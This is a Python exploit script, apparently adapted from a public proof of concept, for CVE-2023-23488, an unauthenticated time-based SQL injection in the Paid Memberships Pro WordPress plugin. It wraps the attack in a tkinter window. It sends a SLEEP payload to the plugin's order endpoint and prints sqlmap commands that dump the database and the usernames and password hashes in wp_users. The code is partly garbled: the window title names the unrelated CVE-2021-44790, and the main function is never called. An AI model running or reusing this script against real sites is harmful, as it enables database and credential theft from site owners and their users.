#!/usr/bin/env python
# -*- coding: utf-8 -*-
# https://github.com/r3nt0n
#
# Exploit Title: Paid Memberships Pro < 2.9.8 (WordPress Plugin) - Unauthenticated SQL Injection
#
# Exploit Author: r3nt0n
# CVE: CVE-2023-23488
# Date: 2023/01/24
# Vulnerability discovered by Joshua Martinelle
# Vendor Homepage: https://www.paidmembershipspro.com
# Software Link: https://downloads.wordpress.org/plugin/paid-memberships-pro.2.9.7.zip
# Advisory: https://github.com/advisories/GHSA-pppw-hpjp-v2p9
# Version: < 2.9.8
# Tested on: Debian 11 - WordPress 6.1.1 - Paid Memberships Pro 2.9.7
#
# Running this script against a WordPress instance with Paid Membership Pro plugin
# tells you if the target is vulnerable.
# As the SQL injection technique required to exploit it is Time-based blind, instead of
# trying to directly exploit the vuln, it will generate the appropriate sqlmap command
# to dump the whole database (probably very time-consuming) or specific chose data like
# usernames and passwords.
#
# Usage example: python3 CVE-2023-23488.py http://127.0.0.1/wordpress

import sys
import requests
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def r3nt0n():
    root = tkinter.Tk()
    root.title("CVE-2021-44790 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        target_url = inp
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)
        txtarea.pack(fill=BOTH, expand=True)
        txtarea.configure(state ='disabled')
        def get_request(target_url, delay="1"):
            payload = "a' OR (SELECT 1 FROM (SELECT(SLEEP(" + delay + ")))a)-- -"
            data = {'rest_route': '/pmpro/v1/order','code': payload}
            return requests.get(target_url, params=data).elapsed.total_seconds()
        txtarea.insert(END, 'Paid Memberships Pro < 2.9.8 (WordPress Plugin) - Unauthenticated SQL Injection\n')
       # print('Paid Memberships Pro < 2.9.8 (WordPress Plugin) - Unauthenticated SQL Injection\n')

        try:
            txtarea.insert(END, '[-] Testing if the target is vulnerable...')
            #print('[-] Testing if the target is vulnerable...')
            req = requests.get(target_url, timeout=15)
        except:
            txtarea.insert(END, '{}[!] ERROR: Target is unreachable{}'.format(u'\033[91m',u'\033[0m'))
            #print('{}[!] ERROR: Target is unreachable{}'.format(u'\033[91m',u'\033[0m'))
  #  sys.exit(2)

        if get_request(target_url, "1") >= get_request(target_url, "2"):
            txtarea.insert(END, '{}[!] The target does not seem vulnerable{}'.format(u'\033[91m',u'\033[0m'))
            #print('{}[!] The target does not seem vulnerable{}'.format(u'\033[91m',u'\033[0m'))
   # sys.exit(3)
       # print('\n{}[*] The target is vulnerable{}'.format(u'\033[92m', u'\033[0m'))
      #  print('\n[+] You can dump the whole WordPress database with:')
        #print('sqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump'.format(target_url))
        #print('\n[+] To dump data from specific tables:')
       # print('sqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users'.format(target_url))
       # print('\n[+] To dump only WordPress usernames and passwords columns (you should check if users table have the default name):')
        #print('sqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users -C user_login,user_pass'.format(target_url))
        txtarea.insert(END, '\n{}[*] The target is vulnerable{}'.format(u'\033[92m', u'\033[0m'))
        txtarea.insert(END, '\n[+] You can dump the whole WordPress database with:')
        txtarea.insert(END, '\nsqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump'.format(target_url))
        txtarea.insert(END, '\n[+] To dump data from specific tables:\n')
        txtarea.insert(END, 'sqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users'.format(target_url))
        txtarea.insert(END, '\n[+] To dump only WordPress usernames and passwords columns (you should check if users table have the default name):')
        txtarea.insert(END, 'sqlmap -u "{}/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users -C user_login,user_pass'.format(target_url))

    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
